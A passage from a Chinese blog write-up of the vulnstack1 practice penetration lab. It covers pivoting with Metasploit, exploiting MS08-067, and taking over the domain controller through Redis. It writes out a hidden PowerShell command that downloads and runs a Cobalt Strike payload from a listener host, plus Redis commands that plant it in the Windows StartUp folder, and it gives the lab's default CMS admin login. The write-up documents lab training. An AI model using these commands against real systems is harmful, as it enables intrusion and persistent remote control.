+<h5 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#查看路由信息</span><br><span class="line">run get_local_subnets</span><br><span class="line">#添加一条路由</span><br><span class="line">run autoroute -s 192.168.52.0&#x2F;24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20210106204627812.png" alt="image-20210106204627812"></p>
+<h5 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Background</span><br><span class="line">use auxiliary&#x2F;server&#x2F;socks4a</span><br><span class="line">Set srvhost 192.168.247.146</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20210106204702450.png" alt="image-20210106204702450"></p>
+<h5 id="探测并尝试利用MS17-010漏洞，利用失败"><a href="#探测并尝试利用MS17-010漏洞，利用失败" class="headerlink" title="探测并尝试利用MS17-010漏洞，利用失败"></a>探测并尝试利用MS17-010漏洞，利用失败</h5><p><img src="/imgs/image-20210106204743415.png" alt="image-20210106204743415"></p>
+<p><img src="/imgs/image-20210106204807779.png" alt="image-20210106204807779"></p>
+<h5 id="发现平台里面给出了MS08-067，利用成功，getshell且权限为system"><a href="#发现平台里面给出了MS08-067，利用成功，getshell且权限为system" class="headerlink" title="发现平台里面给出了MS08-067，利用成功，getshell且权限为system"></a>发现平台里面给出了MS08-067，利用成功，getshell且权限为system</h5><p><img src="/imgs/image-20210106204848059.png" alt="image-20210106204848059"></p>
+<p><img src="/imgs/image-20210106204923573.png" alt="image-20210106204923573"></p>
+<h5 id="尝试将MSF会话派生到CS失败了"><a href="#尝试将MSF会话派生到CS失败了" class="headerlink" title="尝试将MSF会话派生到CS失败了"></a>尝试将MSF会话派生到CS失败了</h5><p><img src="/imgs/image-20210106205035633.png" alt="image-20210106205035633"></p>
+<h4 id="6、渗透域控"><a href="#6、渗透域控" class="headerlink" title="6、渗透域控"></a>6、渗透域控</h4><h5 id="尝试利用MS17-010攻击域控也失败了"><a href="#尝试利用MS17-010攻击域控也失败了" class="headerlink" title="尝试利用MS17-010攻击域控也失败了"></a>尝试利用MS17-010攻击域控也失败了</h5><p><img src="/imgs/image-20210106205150473.png" alt="image-20210106205150473"></p>
+<p>DC还开放了其它端口80和88，iis服务，没有可利用之处。</p>
+<h5 id="redis获取DC"><a href="#redis获取DC" class="headerlink" title="redis获取DC"></a>redis获取DC</h5><p>发现提示有redis，但是我扫描都没找到这个端口开放了，后来发现服务没开，进到c:\redis\开了redis服务。redis-server.exe redis.windows.conf。</p>
+<p><img src="/imgs/image-20210112204903767.png" alt="image-20210112204903767"></p>
+<p>利用redis写入自启动</p>
+<p>在CS创建监听和生成payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:80&#x2F;a&#39;))&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/image-20210112205014287.png" alt="image-20210112205014287"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">windows 2008自启动目录：C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</span><br><span class="line">注意目录在redis要用正斜杠</span><br><span class="line">1、config set dir &quot;C:&#x2F;ProgramData&#x2F;Microsoft&#x2F;Windows&#x2F;Start Menu&#x2F;Programs&#x2F;StartUp&quot;</span><br><span class="line">2、CONFIG SET dbfilename 360start.bat</span><br><span class="line">3、set x &quot;\r\n\r\npowershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.52.128:80&#x2F;111&#39;))&quot;&quot;\r\n\r\n&quot;</span><br><span class="line">4、save</span><br></pre></td></tr></table></figure>
+
+<h3 id="三、其它记录"><a href="#三、其它记录" class="headerlink" title="三、其它记录"></a>三、其它记录</h3><p>YXCMS漏洞：<a href="https://blog.csdn.net/xiaoi123/article/details/82758233" target="_blank" rel="noopener">https://blog.csdn.net/xiaoi123/article/details/82758233</a></p>
+<p><img src="/imgs/image-20210112204720337.png" alt="image-20210112204720337"></p>
+<p><a href="http://192.168.247.133/yxcms/index.php?r=admin/index/login" target="_blank" rel="noopener">http://192.168.247.133/yxcms/index.php?r=admin/index/login</a> admin/123456</p>
+<p>后台任意文件写入getshell</p>
+<p><img src="/imgs/image-20210112204813073.png" alt="image-20210112204813073"></p>
+<h3 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h3><p><a href="https://chaceshadow.github.io/2020/09/28/ATC-CK-Vulnstack-1/" target="_blank" rel="noopener">ATK&amp;CK红队评估实战靶场（一）的搭建和模拟攻击过程</a><br><a href="http://www.dtmao.cc/news_show_128035.shtml" target="_blank" rel="noopener">ATT&amp;cK实战系列—红队实战(一)</a><br><a href="https://www.jianshu.com/p/d9930311303f" target="_blank" rel="noopener">metasploit与Cobaltstrike互相派生shell</a><br><a href="https://www.freebuf.com/articles/network/125278.html" target="_blank" rel="noopener">vulnstack1</a><br><a href="https://www.cnblogs.com/chenglee/p/9259426.html" target="_blank" rel="noopener">kali meterpreter中mimikatz模块获取密码</a><br><a href="https://www.anquanke.com/post/id/170360,https://www.freebuf.com/articles/web/237263.html" target="_blank" rel="noopener">Redis在Windows下的利用</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、实验环境"><span class="toc-number">1.</span> <span class="toc-text">一、实验环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、实战"><span class="toc-number">2.</span> <span class="toc-text">二、实战</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、目标192-168-247-133信息收集"><span class="toc-number">2.1.</span> <span class="toc-text">1、目标192.168.247.133信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、Getshell"><span class="toc-number">2.2.</span> <span class="toc-text">2、Getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、本机信息收集并提权"><span class="toc-number">2.3.</span> <span class="toc-text">3、本机信息收集并提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、内网信息收集"><span class="toc-number">2.4.</span> <span class="toc-text">4、内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#域相关信息收集"><span class="toc-number">2.4.1.</span> <span class="toc-text">域相关信息收集</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#探测内网存活主机"><span class="toc-number">2.4.2.</span> <span class="toc-text">探测内网存活主机</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#探测端口存活情况"><span class="toc-number">2.4.3.</span> <span class="toc-text">探测端口存活情况</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#梳理目前网络情况及攻击思路"><span class="toc-number">2.4.4.</span> <span class="toc-text">梳理目前网络情况及攻击思路</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5、横向渗透192-168-52-141"><span class="toc-number">2.5.</span> <span class="toc-text">5、横向渗透192.168.52.141</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#MSF反弹shell"><span class="toc-number">2.5.1.</span> <span class="toc-text">MSF反弹shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#或者CS派生会话到MSF"><span class="toc-number">2.5.2.</span> <span class="toc-text">或者CS派生会话到MSF</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#添加路由"><span class="toc-number">2.5.3.</span> <span class="toc-text">添加路由</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#设置代理"><span class="toc-number">2.5.4.</span> <span class="toc-text">设置代理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#探测并尝试利用MS17-010漏洞，利用失败"><span class="toc-number">2.5.5.</span> <span class="toc-text">探测并尝试利用MS17-010漏洞，利用失败</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#发现平台里面给出了MS08-067，利用成功，getshell且权限为system"><span class="toc-number">2.5.6.</span> <span class="toc-text">发现平台里面给出了MS08-067，利用成功，getshell且权限为system</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#尝试将MSF会话派生到CS失败了"><span class="toc-number">2.5.7.</span> <span class="toc-text">尝试将MSF会话派生到CS失败了</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6、渗透域控"><span class="toc-number">2.6.</span> <span class="toc-text">6、渗透域控</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#尝试利用MS17-010攻击域控也失败了"><span class="toc-number">2.6.1.</span> <span class="toc-text">尝试利用MS17-010攻击域控也失败了</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#redis获取DC"><span class="toc-number">2.6.2.</span> <span class="toc-text">redis获取DC</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、其它记录"><span class="toc-number">3.</span> <span class="toc-text">三、其它记录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四、参考链接"><span class="toc-number">4.</span> <span class="toc-text">四、参考链接</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/&text=内网渗透靶场vulnstack系列：vulnstack1" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/&title=内网渗透靶场vulnstack系列：vulnstack1" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/&is_video=false&description=内网渗透靶场vulnstack系列：vulnstack1" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网渗透靶场vulnstack系列：vulnstack1&body=Check out this article: http://yoursite.com/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/&title=内网渗透靶场vulnstack系列：vulnstack1" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/&title=内网渗透靶场vulnstack系列：vulnstack1" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/&title=内网渗透靶场vulnstack系列：vulnstack1" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/&title=内网渗透靶场vulnstack系列：vulnstack1" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/&name=内网渗透靶场vulnstack系列：vulnstack1&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/12/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAvulnstack%E7%B3%BB%E5%88%97%EF%BC%9Avulnstack1/&t=内网渗透靶场vulnstack系列：vulnstack1" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    R17a
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
